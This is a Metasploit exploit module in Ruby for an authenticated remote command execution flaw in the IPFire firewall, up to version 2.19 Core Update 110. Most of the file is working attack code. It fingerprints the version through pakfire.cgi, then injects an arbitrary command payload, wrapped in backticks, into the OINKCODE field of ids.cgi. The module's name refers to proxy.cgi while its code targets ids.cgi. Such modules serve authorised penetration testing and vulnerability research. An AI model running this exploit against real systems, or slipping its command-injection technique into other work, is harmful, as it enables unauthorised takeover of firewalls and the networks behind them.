## This module requires Metasploit: http://metasploit.com/download
## Current source: https://github.com/rapid7/metasploit-framework
###

class MetasploitModule < Msf::Exploit::Remote
  include Msf::Exploit::Remote::HttpClient

  Rank = ExcellentRanking
  def initialize(info = {})
    super(
      update_info(
        info,
        &#039;Name&#039;        => &#039;IPFire proxy.cgi RCE&#039;,
        &#039;Description&#039; => %q(
          IPFire, a free linux based open source firewall distribution,
          version < 2.19 Update Core 110 contains a remote command execution
          vulnerability in the ids.cgi page in the OINKCODE field.
        ),
        &#039;Author&#039;      =>
          [
            &#039;h00die <mike@stcyrsecurity.com>&#039;, # module
            &#039;0x09AL&#039;                         # discovery
          ],
        &#039;References&#039;  =>
          [
            [ &#039;EDB&#039;, &#039;42149&#039; ]
          ],
        &#039;License&#039;        => MSF_LICENSE,
        &#039;Platform&#039;       => &#039;unix&#039;,
        &#039;Privileged&#039;     => false,
        &#039;DefaultOptions&#039; => { &#039;SSL&#039; => true },
        &#039;Arch&#039;           => [ ARCH_CMD ],
        &#039;Payload&#039;        =>
          {
            &#039;Compat&#039; =>
              {
                &#039;PayloadType&#039; => &#039;cmd&#039;,
                &#039;RequiredCmd&#039; => &#039;perl awk openssl&#039;
              }
          },
        &#039;Targets&#039;        =>
          [
            [ &#039;Automatic Target&#039;, {}]
          ],
        &#039;DefaultTarget&#039; => 0,
        &#039;DisclosureDate&#039; => &#039;Jun 09 2017&#039;
      )
    )

    register_options(
      [
        OptString.new(&#039;USERNAME&#039;, [ true, &#039;User to login with&#039;, &#039;admin&#039;]),
        OptString.new(&#039;PASSWORD&#039;, [ false, &#039;Password to login with&#039;, &#039;&#039;]),
        Opt::RPORT(444)
      ]
    )
  end

  def check
    begin
      # authorization header required, see https://github.com/rapid7/metasploit-framework/pull/6433#r56764179
      # after a chat with @bcoles in IRC.
      res = send_request_cgi(
        &#039;uri&#039;           => &#039;/cgi-bin/pakfire.cgi&#039;,
        &#039;method&#039;        => &#039;GET&#039;,
        &#039;authorization&#039; => basic_auth(datastore[&#039;USERNAME&#039;], datastore[&#039;PASSWORD&#039;])
      )

      if res && res.code == 200
        /\<strong\>IPFire (?<version>[\d.]{4}) \([\w]+\) - Core Update (?<update>[\d]+)/ =~ res.body
      end
      if version.nil? || update.nil? || !Gem::Version.correct?(version)
        vprint_error(&#039;No Recognizable Version Found&#039;)
        CheckCode::Safe
      elsif Gem::Version.new(version) <= Gem::Version.new(&#039;2.19&#039;) && update.to_i <= 110
        CheckCode::Appears
      else
        vprint_error(&#039;Version and/or Update Not Supported&#039;)
        CheckCode::Safe
      end
    rescue ::Rex::ConnectionError
      print_error("Connection Failed")
      CheckCode::Safe
    end
  end

  def exploit
    begin
      # authorization header required, see https://github.com/rapid7/metasploit-framework/pull/6433#r56764179
      # after a chat with @bcoles in IRC.
      vprint_status(&#039;Sending request&#039;)
      res = send_request_cgi(
        &#039;uri&#039;           => &#039;/cgi-bin/ids.cgi&#039;,
        &#039;method&#039;        => &#039;POST&#039;,
        &#039;authorization&#039; => basic_auth(datastore[&#039;USERNAME&#039;], datastore[&#039;PASSWORD&#039;]),
        &#039;headers&#039;       =>
          {
            &#039;Referer&#039; => "#{datastore[&#039;SSL&#039;] ? &#039;https&#039; : &#039;http&#039;}://#{datastore[&#039;RHOST&#039;]}:#{datastore[&#039;RPORT&#039;]}/cgi-bin/ids.cgi"
          },
        &#039;vars_post&#039;          => {
          &#039;ENABLE_SNORT_GREEN&#039; => &#039;on&#039;,
          &#039;ENABLE_SNORT&#039; => &#039;on&#039;,
          &#039;RULES&#039; => &#039;registered&#039;,
          &#039;OINKCODE&#039; => "`#{payload.encoded}`",
          &#039;ACTION&#039; => &#039;Download new ruleset&#039;,
          &#039;ACTION2&#039; => &#039;snort&#039;
          }
      )

      # success means we hang our session, and wont get back a response, so just check we get a response back
      if res && res.code != 200
        fail_with(Failure::UnexpectedReply, "#{peer} - Invalid credentials (response code: #{res.code})")
      end
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service")
    end
  end
end

